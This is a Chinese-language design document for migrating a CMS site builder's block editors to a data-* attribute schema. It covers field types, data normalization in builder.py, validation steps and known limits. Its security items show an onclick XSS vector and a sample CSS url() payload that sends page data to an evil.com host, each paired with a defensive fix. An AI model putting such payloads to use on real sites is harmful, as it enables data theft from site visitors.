`renderListEditor()` 替换 panel_page_edit.html 中 5 套重复的列表编辑器代码（addModule 中的 ~180 行 + Jinja2 模板中的 ~120 行），也替换 admin_modules.js buildModuleHTML() 中对应的 `specialEditor` 分支。

**I. `visibility` 字段类型 —— 眼球开关控件**

`data-type="visibility"` 生成眼球图标开关（与当前 `visToggle()` 函数等效）。

```html
<meta data-field="show_phone" data-label="电话" data-type="visibility" data-default="true">
```

渲染输出：
- 眼球开/关 SVG 图标按钮
- 隐藏的 `<input type="hidden">` 存储 `"true"` / `"false"`
- 点击按钮切换图标 + 更新 hidden input 值

与 `toggle` 的区别：
- `toggle` → `<select>` 下拉，适用于通用布尔选择（启用/禁用、左/右）
- `visibility` → 眼球开关，适用于控制页面元素的显隐

`renderField()` 中新增 `visibility` 分支，等价于调用现有 `visToggle()` 函数。contact_info 的 `show_phone` / `show_mobile` / `show_email` / `show_address` / `show_business_hours` 和 contact_form 的 `show_name` / `show_email` / `show_phone` / `show_company` / `show_message` / `show_map` / `show_form` 使用此类型。

**J. `data-no-resp` —— 响应式控件自动检测**

扫描器根据以下规则判断是否显示响应式覆写控件（每行列数、每页数量）：

1. 模板中存在 `data-repeat` 容器 → 默认显示响应式控件
2. 根元素有 `data-no-resp` 属性 → 强制不显示（hero_banner 是唯一例外）
3. 模板中无 `data-repeat` → 不显示（section_title、text_content、highlight_card、item_detail）

当前 `admin_modules.js:140` 和 `panel_page_edit.html:2866` 的硬编码 `needsResp` 判断由扫描器输出的字段定义标记替代。

实现方式：`renderField()` 不需要改动 —— 响应式覆写控件不在字段级别，而在模块编辑器的外层框架（平板端/手机端 tabs）。admin JS 根据字段定义中的 `no_responsive` 标记决定是否渲染这些 tabs。

**K. `_modules.html` 旧数据格式兼容**

当前 `_modules.html` 第 3 行有硬编码：

```jinja2
{% if module.data is mapping or (module.type == 'hero_banner' and module.data is iterable and module.data is not string) %}
```

这是为了兼容旧站点中 hero_banner 的 data 直接存为列表（`[{type: image, ...}]`）而非 `{slides: [...]}` 的情况。

在 data-* 模式中，此兼容逻辑移到 builder.py 的渲染准备阶段：

```python
# builder.py 在 _render_for_language() 中，渲染前做数据格式标准化
def _normalize_module_data(module: dict, block_fields: dict[str, list[dict]]) -> dict:
    """旧格式兼容：列表数据 → {listKey: [...]}"""
    block_type = module.get('type', '')
    data = module.get('data', {})
    if isinstance(data, list):
        fields = block_fields.get(block_type, [])
        list_fields = [f for f in fields if f.get('type') == 'list']
        if list_fields:
            list_key = list_fields[0]['key']
            return {list_key: data}
    return data
```

`_modules.html` 随之简化为 `{% if module.data is mapping %}`，不再引用具体 block type。

**调用位置**（`builder.py` 的 `_render_for_language()` 方法）：

```python
# _render_for_language() 中，遍历页面模块时：
for module in page.get('modules', []):
    module['data'] = _normalize_module_data(module, block_fields)
    # 此后 module.data 保证是 dict 格式，模板和后处理函数无需再做兼容判断
```

`_normalize_module_data()` 应在构建模块上下文（ctx）之前调用，确保传给模板的 `module.data` 始终是 dict。

### 9.4 验证标准（hero_banner 迁移时必须全部通过）

1. 后台新建 hero_banner 模块 → 属性面板表单正确渲染所有字段（含颜色选择器、单位选择器）
2. 填写字段值 → 保存 → 刷新页面 → 已保存模块打开属性面板，表单与新建时一致
3. 数据集编辑器（如有 hero_banner 的数据绑定）中表单也一致
4. **admin_modules.js 中不存在 `case 'hero_banner':` 或类似硬编码分支**
5. **routes.py 的 `_parse_modules_form()` 中不存在 `hero_banner` 特殊解析分支**
6. **panel_page_edit.html 的 Jinja2 部分不存在 `hero_banner` 硬编码分支**
7. **panel_page_edit.html 的 `addModule()` 中不存在 `hero_banner` 硬编码分支**
8. 构建站点 → 输出 HTML 与迁移前 diff 一致（或仅有预期的空格/换行/属性顺序差异）

如果验证不通过（某个字段类型 renderField() 不支持，或解析逻辑无法通用化），则先增强基础设施的通用能力，再继续迁移。**不准为 data-* 模式新增任何 per-block 硬编码代码。**

---

## 十、限制与边界

1. **`data-repeat` 不支持嵌套** —— 列表项内部不能有子列表
2. **同一个 `data-repeat-item` 内的 `data-key` 必须唯一** —— 不同 scope 之间允许重复。`data-key` 推荐用纯字母数字命名（可读性），但技术上允许下划线
3. **CSS 简写属性和子属性是独立字段** —— `padding` 和 `padding-top` 不会自动关联，模板作者自行保证不重复声明
4. **`data-options` 分隔符不转义** —— 标签和值中不能包含 `:` 或 `, `。必要时用全角 `：` `，` 替代，扫描器自动还原
5. **`font-weight` 和 `text-align` 的下拉选项固定** —— 如需自定义选项，用 `<meta data-type="select">` 声明同名 key 覆盖（meta 优先级高于 CSS 自动推断）
6. **复杂条件样式（一个字段控制多个 CSS 属性）用 `data-attr-style` 处理** —— 字段值存储整段 CSS 字符串，注入时追加到目标元素的 style 末尾。前端用 `<meta data-type="select">` 声明下拉选项，选项值用全角 `：` `，` 转义 CSS 中的 `:` 和 `,`
7. **`html.parser` 对畸形 HTML 的容忍度有限** —— template.html 必须是合法的 HTML（可以含 Jinja2 标签，但 HTML 标签必须正确闭合）
8. **变体（variants）已通过 CSS 字段 + data-show-if 解决** —— 旧 meta.yaml 的 `variants:` 机制（如 highlight_card 的 image_position 左/右布局、contact_form 的 layout 正/反布局）已替换为 CSS `flex-direction` select 字段。process_steps 的 `step_style` / `direction` 变体已替换为 `data-show-if` 互斥组。旧 variants 机制不再需要
9. **文件上传控件的触发依赖 key 命名约定** —— `renderField()` 根据 key 是否匹配 `/image|cover|background|media|photo|logo/i` 来决定是否追加上传控件。如果 CSS 字段 key 中意外包含这些关键词（如 `section_background` 触发上传），会多出一个无害但多余的按钮。模板作者命名 `data-key` 时需注意
10. **数据集绑定 Block（data_grid / product_grid）的迁移复杂度高** —— 它们涉及 `all_datasets` 数据源、动态字段映射、`_modules.html` 的 `detail` 路由、模板中的 `{% for item in dataset_key %}` 等特殊逻辑。这些 Block 排在迁移顺序最后，确保基础设施在简单 Block 上充分验证后再处理。**注意：item_detail 不属于此类**——它使用 `module.data` 而非 `all_datasets`，是自包含模块（详见 §8.4）
11. **旧数据格式兼容** —— 部分旧站点的 hero_banner data 直接存储为列表（`data: [{type: image, ...}]`），而非 `data: {slides: [...]}`。扫描器和后处理函数不需要处理此兼容（由 builder 在渲染前做格式标准化，详见 §9.3-K），但迁移验证时必须用新旧两种数据格式各构建一次确保输出一致
12. **`_modules.html` 的 `module.type` 硬编码** —— 当前 `_modules.html` 第 3 行有 `module.type == 'hero_banner'` 判断（旧数据格式兼容）。标准化在 builder.py 的 `_normalize_module_data()` 中完成（§9.3-K），`_modules.html` 简化为 `{% if module.data is mapping %}`
13. **`admin_modules.js` 的动态字段渲染已存在** —— `buildModuleHTML()` 第 145 行的 `desktopFields` 已经用 `fields.map(renderField)` 做数据驱动渲染。迁移的核心工作是**删除 `specialEditor` / `styleEditor` 中的 per-block 硬编码分支**，让 `desktopFields` 覆盖所有字段。列表字段（data-repeat）的编辑器通过 `renderListEditor()` 插入到 `specialEditor` 位置
14. **`panel_page_edit.html` 的 Jinja2 模板和 `addModule()` 函数** —— 两者各有 ~1144 行和 ~850 行 per-block 硬编码分支。消除策略与 admin_modules.js 相同：Jinja2 侧用 `{% for field in fields %}` + `renderField()` 宏替代 `{% if module.type == 'xxx' %}`；`addModule()` 侧用 `fields.forEach(renderField)` + `renderListEditor()` 替代 `if (type === 'xxx')` 分支
15. **`item_data` Block 暂不迁移** —— `item_data` 不是普通 Block，它是数据集的条目编辑界面（含 slug、date、body 等固定字段 + 动态自定义字段）。它使用 `isDatasetMode` 和 `editItem` 上下文，与 `data-repeat` 列表机制完全不同。**`item_data` 的 `specialEditor` 硬编码保留**，不在 data-* 迁移计划中。其余 13 个 Block 完成迁移后视情况决定是否跟进
16. **跨数据源字段（settings.contact）不在 data-* 自动处理范围内** —— contact_info 和 contact_form 的电话、邮箱等值存储在 `settings.contact` 中，而非 `module.data`。后处理函数（`inject_styles`/`inject_content`/`apply_visibility`）只从 `module.data` 取值。这两个 Block 的迁移范围缩小为：CSS 字段用 `data-label-*`，visibility 开关用 `data-type="visibility"`，`settings.contact` 数据读取保留模板中的 Jinja2 `{% set contact = settings.contact %}`


17. **`data-attr-<name>` 可注入事件处理器（XSS）** —— 管理员可通过 `data-attr-onclick="key"` 把字段值注入为 `onclick="..."` 属性，如果字段值包含恶意 JS 就直接 XSS。**解决方案：** 在 `inject_content()` 中维护 `on*` 属性黑名单（`onclick`, `onload`, `onerror`, `onmouseover` 等），扫描器在验证阶段也拒绝 `data-attr-on*` 声明并报错。事件处理器在这套系统中没有合法使用场景，直接禁止最安全。

18. **`data-attr-style` CSS 注入可泄露数据** —— `background-image: url("https://evil.com/steal?data=xxx")` 把页面内容作为 query 参数发到外部服务器（CSS 的 `url()` 会触发 HTTP 请求）。**解决方案：** `inject_styles()` 在写入 `style` 前过滤 CSS 值中的 `url(` —— 检查 URL 是否指向本域名、`data:` URI、或已知 CDN 白名单域名（如阿里云 OSS），其他域名拒绝并写日志。模板内置的默认值不受此限制（只检查用户写入的字段值）。

19. **用户字段值含引号破坏 HTML** —— 如果管理员在字段中填写 `12" monitor` 或 `it's good`，直接拼接到 `style="..."` 或 `content="..."` 会破坏属性边界。**解决方案：** `inject_content()` 和 `inject_styles()` 在写入属性值前统一调用 `html.escape(value, quote=True)`，把 `"` 转成 `&quot;`、`'` 转成 `&#x27;`。style 属性中的值额外检查：`;` 和 `{` `}` 不转义（它们是 CSS 合法字符），但确保整个 style 值被 `"` 包裹且内部 `"` 已转义。

20. **扫描器不检测注入元素是否缺少 `data-key`** —— 合法的 `data-content="title"` 所在元素没有 `data-key` 时，后处理函数找不到目标（因为 `inject_content()` 用 `data-key` 匹配），值永远注入不进去，形成静默失效。**解决方案：** 模板扫描器第 5e 步增加验证：遍历所有带注入属性（`data-content`, `data-src`, `data-href`, `data-bg`, `data-attr-style`, `data-attr-*`）的元素，如果该元素缺少 `data-key` 则**报错退出**（不是警告），阻断不完整的模板进入生产。

21. **`expand_repeat_items()` 克隆导致 `data-key` 重复** —— 列表模板项被克隆 N 次后，每个克隆体都有相同的 `data-key` 值（如 `data-key="title"` 出现在 3 个 slide 中）。**解决方案：** `data-key` 的唯一性约束是**同一 `data-repeat-item` 内**的要求（见 §十第 2 条），跨 item 的重复是合法的。后处理函数（`inject_content`/`inject_styles`）按 item 索引独立处理每个克隆体，互不干扰。`strip_schema_output()` 也不依赖 `data-key` 做匹配，不受影响。唯一需要确保的是：编辑器的表单 name 前缀包含 `_{itemIndex}_` 以区分不同项的同名字段。

22. **每个模块渲染时做 5 轮 HTML parse/serialize（性能隐患）** —— 管线中 `expand_repeat_items()`、`inject_styles()`、`inject_content()`、`apply_visibility()`、`strip_schema_output()` 各自独立 parse → modify → serialize，对于有 50 个模块的页面就是 250 轮树遍历。**解决方案：** 合并 `inject_styles() + inject_content() + apply_visibility()` 为一轮遍历（`apply_all_injections()`），一次 parse 完成三种注入。`expand_repeat_items()` 和 `strip_schema_output()` 因逻辑独立（一个在渲染前，一个在渲染后）保持独立步骤。最终管线简化为：Jinja2 渲染 → expand_repeat_items() → apply_all_injections() → strip_schema_output()，从 5 步降到 4 步，parse/serialize 从 5 次降到 3 次。

23. **`strip_schema_output()` 的正则方案有边界情况** —— 用正则 `/data-(key|content|src|href|bg|attr-style|label|show-if|repeat)="[^"]*"/g` 删除 schema 属性时，如果属性值内含转义引号 `"` 或属性跨行（`data-attr-style="...
..."` 虽然不是合法 HTML 但 html.parser 能容忍），正则可能残留垃圾或误删内容。**解决方案：** 不用正则，改用 `html.parser`（Python 标准库）：解析 HTML → 遍历所有元素 → `del elem.attrs['data-key']` 等 → serialize 回去。比正则慢一点但完全可靠。如果性能敏感，可以先 benchmark —— 50 模块页面的 parse/serialize 在现代机器上应在 50ms 以内，可接受。

24. **基础设施改动影响所有 13 个 Block 的渲染和编辑** —— `_parse_modules_form()`、`renderField()`、`buildModuleHTML()` 等函数的修改是一次性切换，万一改错会影响全站（所有 Block 的管理后台都会坏）。**解决方案：** （a）旧代码只注释不删除，用 `## OLD:` 前缀标记，等 hero_banner 验证通过 + 回归测试全部 13 个 Block 后再统一清理；（b）为 `renderField()` 新增字段类型时用 feature flag（`if field.get('_schema_v2'): ... else: ...`），让新旧两种字段定义格式共存，渐进切换。

25. **表单前缀从 `module_{idx}_data_` 变为 `module_{idx}_data_{listKey}_{itemIndex}_` 期间存在迁移窗口** —— 已在数据库中保存的旧格式列表数据（如 `module_0_data_slides_0_title`）不会被新前缀解析。**解决方案：** `_parse_modules_form()` 中优先匹配新前缀，匹配不到时回退到旧前缀模式（`module_{idx}_data_{itemIndex}_{fieldKey}`）。回退分支只在迁移过渡期存在，全站重建（build-site）后旧数据自然转为新格式，届时删除回退逻辑。

26. **`_normalize_module_data()` 如果不做幂等保护，可能把已标准化的数据误处理** —— 如果 builder 因某种原因两次调用 `_normalize_module_data()`，第二次调用时 `module.data` 已经是 `{slides: [...]}`（dict），但旧格式检测条件 `isinstance(data, list)` 为 False，所以不会误处理。但如果出现新格式 `{slides: [...]}` 但 slides 的值也是 list，也不会被误判。**当前实现已天然幂等** —— 仅当 `isinstance(data, list)` 为 True 时才转换。但为防御未来新增格式兼容时的回归，建议加一个显式的幂等标记：标准化后在 module 上设置 `_normalized = True`，函数入口检查此标记直接返回原值。

27. **`data-label` 批模式生成过多字段** —— 一个元素上如果有 8 个 CSS 属性（`font-size`, `color`, `background-color`, `padding`, `margin`, `border`, `text-align`, `line-height`），批模式会生成 8 个字段，其中很多用户根本不需要修改。**解决方案：** 不限制批模式的默认行为（生成所有字段），但在文档中向模板作者强调：（a）用 `data-skip-field="font-size, line-height"` 排除不需要的 CSS 属性；（b）用 `data-label-<prop>` 显式声明只需要的属性（此时批模式不生效）。扫描器在模板扫描报告中也输出每个 Block 的字段数量，超过 20 个时给出 `[INFO]` 建议检查是否有冗余字段。

28. **内置中文词典不完整** —— `data-label` 依赖的 CSS 属性中文映射词典只有 24+ 个属性。CSS 有 200+ 标准属性，未来新 Block 可能用到 `backdrop-filter`、`mix-blend-mode`、`object-fit` 等词典未覆盖的属性。**解决方案：** （a）词典放在独立文件 `app/core/css_labels.py` 中，易于维护和补充；（b）扫描器遇到词典未覆盖的属性时输出 `[WARN] 属性 xxx 无中文映射，请加 data-label-xxx`；（c）模板作者临时用 `data-label-<prop>` 绕过，同时提交词典补充 PR。这是一个"维护型"问题，不是"阻塞型"问题。

29. **`item_detail` 的双列表编辑器（左侧导航列表 + 右侧详情列表）需要唯一标识** —— `renderListEditor()` 通过 `listKey` 生成 DOM id，但 item_detail 有两个列表（如 `tabs` + `sections`），两个编辑器的 id 必须不冲突。**解决方案：** `renderListEditor(moduleIdx, listKey, ...)` 生成的 DOM id 格式为 `list-editor-{moduleIdx}-{listKey}`（如 `list-editor-0-tabs`、`list-editor-0-sections`），天然唯一。编辑器的初始化和事件绑定按 `moduleIdx + listKey` 联合查找，不需要全局唯一 id。

30. **`data_grid` / `product_grid` 的数据集绑定字段与 CSS 字段混在一起，扫描器可能混淆** —— 数据集字段（如 `data-field="title" data-source="articles"`）和 CSS 字段（如 `data-label="标题颜色"`）都通过 `<meta>` 声明，如果 `data-field` 的 key 和某个 CSS 属性重名，扫描器可能把数据集字段误当 CSS 字段处理。**解决方案：** `<meta>` 标签的 `data-source` 属性是区分标记 —— 有 `data-source` 的 meta 是数据集绑定字段，不参与 CSS 字段推断。扫描器在解析 meta 时先检查 `data-source` 是否存在，存在则走数据集字段分支，跳过 CSS 自动推断逻辑。如果同一个 key 既出现在 CSS 字段中又出现在数据集字段中，扫描器报错退出（字段 key 冲突）。

31. **CSS 自定义属性（`--*`）应在批模式下自动跳过** —— CSS 自定义属性如 `--card-gap`、`--section-padding` 在元素 style 中出现时，`data-label` 批模式不应为其生成字段（它们不是标准 CSS 属性，无法用中文词典映射，且 template.html 中的自定义属性通常是设计系统常量，不需要用户编辑）。**解决方案：** 扫描器在处理 `data-label` 批模式时自动跳过 `--` 开头的 CSS 属性声明（不生成字段、不警告）。模板作者如需暴露某个自定义属性给用户编辑，用 `data-label-<prop>` 显式声明即可（此时正常生成字段）。

32. **模板中残留的 Jinja2 标签被扫描器当作 HTML 文本节点处理，产生噪音** —— 数据集 Block（data_grid / product_grid）的 template.html 中仍有 `{% for item in articles %}` 等 Jinja2 标签。扫描器在解析 template.html 时，这些 Jinja2 标签内的内容会被 html.parser 当作文本节点或未知标签处理，可能产生无意义的字段定义。**解决方案：** 这是已知限制，不需要修复。原因：（a）扫描器只处理 `data-*` 属性，Jinja2 标签不含 `data-*` 因此被忽略；（b）数据集 Block 迁移排在最后（见 §九迁移顺序），届时 Jinja2 标签已大幅减少；（c）残留 Jinja2 最多让扫描器输出几个多余的未知属性警告，不影响字段生成的正确性。扫描器在扫描报告中标注 `[INFO]` 发现 Jinja2 残留标签的位置，供模板作者确认。